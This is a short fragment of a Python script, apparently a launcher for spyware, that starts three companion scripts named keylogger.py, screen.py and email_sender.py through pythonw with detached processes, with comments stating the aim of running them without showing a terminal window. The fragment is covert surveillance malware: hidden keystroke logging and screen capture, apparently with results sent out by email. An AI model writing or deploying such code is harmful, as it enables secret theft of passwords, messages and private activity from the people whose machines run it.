...
# Define the command to run the this.py script
cmd = ['pythonw', 'keylogger.py']

# Run the command without showing the terminal window
subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS, close_fds=True)
cmd = ['pythonw', 'screen.py']

# Run the command without showing the terminal window
subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS, close_fds=True)

cmd = ['pythonw', 'email_sender.py']
